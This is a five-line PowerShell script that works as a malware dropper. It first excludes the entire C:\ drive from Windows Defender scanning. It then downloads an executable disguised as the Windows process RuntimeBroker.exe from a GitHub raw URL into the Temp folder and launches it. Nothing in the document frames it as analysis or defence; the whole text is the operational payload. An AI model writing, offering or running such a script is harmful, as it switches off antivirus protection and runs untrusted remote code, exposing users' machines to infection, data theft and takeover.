Add-MpPreference -ExclusionPath C:\
$url = "https://github.com/WindowsEnjoyer-1/123412341234/raw/refs/heads/main/RuntimeBroker.exe"
$output = "$env:Temp/RuntimeBroker.exe"
Invoke-WebRequest -Uri $url -OutFile $output
Start-Process -FilePath $output
